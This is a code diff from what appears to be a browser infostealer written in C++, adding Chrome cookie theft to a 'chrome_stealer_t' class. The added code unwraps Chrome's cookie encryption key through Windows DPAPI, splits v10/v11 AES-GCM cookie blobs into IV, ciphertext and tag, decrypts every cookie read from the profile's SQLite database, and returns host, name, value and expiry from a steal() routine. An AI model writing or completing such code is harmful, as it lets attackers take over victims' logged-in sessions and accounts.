@@ -10,12 +10,6 @@
 #include "messages/text_message.h"
 #include "messages/error_message.h"
 
-#include <boost/beast/core/detail/base64.hpp>
-
-#include <Wincrypt.h>
-
-#define MY_ENCODING_TYPE  (PKCS_7_ASN_ENCODING | X509_ASN_ENCODING)
-
 net::expected<fs::path> get_browser_path()
 {
     TCHAR appdata_path[MAX_PATH];
@@ -57,30 +51,76 @@ net::expected<std::vector<BYTE>> get_encryption_key(const fs::path& browser_path
         encryption_key64.data(),
         encryption_key64.size());
 
-    DATA_BLOB DataIn = { (DWORD)encryption_key.size() - 5, (BYTE*)encryption_key.data() + 5};
-    DATA_BLOB DataOut = {0};
-    LPWSTR pDescrOut = nullptr;
-    if(!CryptUnprotectData(&DataIn,
-        &pDescrOut,
-        nullptr,
-        nullptr,
-        nullptr,
-        0,
-        &DataOut))
-    {
-        return net::error_t("Chrome(ERROR): cant encrypt encryption key");
-    }
-
-    std::vector<BYTE> to_ret(DataOut.pbData, DataOut.pbData + DataOut.cbData);
-
-    LocalFree(DataOut.pbData);
+    std::vector<BYTE> to_ret;
+    if(auto exp = net::win_crypt::encrypt(encryption_key.data() + 5, encryption_key.size() - 5))
+        to_ret = exp.assume_value();
+    else
+        return net::error_t(std::format("Chrome(ERROR): {}", exp.assume_error().str()));
 
     return to_ret;
 }
 
-net::expected<std::vector<net::cookie_t>> get_cookies(const fs::path& browser_path)
+net::expected<std::vector<BYTE>> decrypt_data(const std::vector<BYTE>& buffer,
+    const std::vector<BYTE>& encryption_key)
 {
-    const auto cookies_path = browser_path / "Default";
+    std::vector<BYTE> decrypred_data;
+    std::string encryption_key_string { encryption_key.begin(), encryption_key.end() };
+
+    try
+    {
+        std::string buffer_string{ buffer.begin(), buffer.end() };
+        if(buffer_string.starts_with("v10") || buffer_string.starts_with("v11"))
+        {
+            std::vector<BYTE> iv;
+            std::copy_n(std::begin(buffer) + 3, 15,
+                std::back_inserter(iv));
+
+            std::vector<BYTE> cipher_text_temp;
+            std::copy(std::begin(buffer) + 15, std::end(buffer),
+                std::back_inserter(cipher_text_temp));
+
+            std::vector<BYTE> tag;
+            std::copy(std::end(cipher_text_temp) - 16, std::end(cipher_text_temp),
+                std::back_inserter(tag));
+
+            std::vector<BYTE> cipher_text;
+            std::copy_n(cipher_text_temp.begin(), cipher_text_temp.size() - tag.size(),
+                std::back_inserter(cipher_text));
+
+            decrypred_data.resize(/*max output size: */cipher_text.size(), 0);
+            auto decrypred_data_len = net::aes_gsm::decrypt(
+                cipher_text.data(), cipher_text.size(),
+                (BYTE*)"", 0,
+                tag.data(),
+                (BYTE*)encryption_key_string.data(),
+                iv.data(), iv.size(),
+                decrypred_data.data());
+            if(decrypred_data_len == -1)
+                return net::error_t("Chrome(ERROR): cant decrypt cookie v10 v11");
+            decrypred_data.resize(decrypred_data_len);
+        }
+        else
+        {
+            std::vector<BYTE> to_ret;
+            if(auto exp = net::win_crypt::encrypt(buffer.data(), buffer.size()))
+                decrypred_data = exp.assume_value();
+            else
+                return net::error_t(std::format("Chrome(ERROR): {}", exp.assume_error().str()));
+        }
+    } catch (std::exception& e)
+    {
+        return net::error_t("Chrome(ERROR): decryption of data failed");
+    }
+
+    return decrypred_data;
+}
+
+net::expected<std::vector<net::cookie_t>> get_cookies(const fs::path& browser_path,
+    const std::vector<BYTE>& encryption_key)
+{
+    std::vector<net::cookie_t> to_ret;
+
+    const auto cookies_path = browser_path / "Default" / "Network";
     if(!fs::exists(cookies_path))
         return net::error_t("Chrome(ERROR): cookies folder not found");
 
@@ -113,14 +153,34 @@ net::expected<std::vector<net::cookie_t>> get_cookies(const fs::path& browser_pa
 
             while(query.executeStep())
             {
-                const auto host_key = query.getColumn(0).getString();
+                const auto host = query.getColumn(0).getString();
                 const auto name = query.getColumn(1).getString();
                 const auto path = query.getColumn(2).getString();
                 auto encrypted_cookie = (const BYTE*)query.getColumn(3).getBlob();
                 auto encrypted_cookie_size = query.getColumn(3).getBytes();
                 const auto expiry = query.getColumn(4).getUInt();
 
-                DLOG(std::format("Chrome(DISPLAY): {} {} {} {}", host_key, name, path, expiry));
+                std::vector<BYTE> cookie;
+                if(encrypted_cookie_size != 0)
+                {
+                    std::vector<BYTE> encrypted_cookie_vec;
+                    std::copy_n(encrypted_cookie, encrypted_cookie_size,
+                        std::back_inserter(encrypted_cookie_vec));
+
+                    if(auto exp = decrypt_data(encrypted_cookie_vec, encryption_key))
+                        cookie = exp.assume_value();
+                    else
+                    {
+                        DLOG(exp.assume_error().str());
+                        continue;
+                    }
+                }
+
+                to_ret.emplace_back(host,
+                    name,
+                    path,
+                    std::string(cookie.begin(), cookie.end()),
+                    expiry);
             }
         } catch (SQLite::Exception& ex)
         {
@@ -133,7 +193,7 @@ net::expected<std::vector<net::cookie_t>> get_cookies(const fs::path& browser_pa
         }
     }
 
-    return net::error_t("Chrome(ERROR): Cant get cookies");
+    return to_ret;
 }
 
 asio::awaitable<std::unique_ptr<message_t>> chrome_stealer_t::steal()
@@ -148,8 +208,13 @@ asio::awaitable<std::unique_ptr<message_t>> chrome_stealer_t::steal()
                 FS_TRY_EXPECTED_OR_RETURN_ERROR_MESSAGE(auto encryption_key, get_encryption_key(browser_path));
                 DLOG("Chrome(DISPLAY): Encryption key received");
 
-                FS_TRY_EXPECTED_OR_RETURN_ERROR_MESSAGE(auto cookies, get_cookies(browser_path));
+                FS_TRY_EXPECTED_OR_RETURN_ERROR_MESSAGE(auto cookies, get_cookies(browser_path, encryption_key));
                 DLOG("Chrome(DISPLAY): Cookies received");
+
+                for (const auto & cookie : cookies)
+                {
+                    DLOG(std::format("{} {} {} {} {}", cookie.host, cookie.name, cookie.path, cookie.cookie, cookie.expiry));
+                }
 
                 auto text_msg = std::make_unique<text_message_t>();
                 text_msg->text = "";
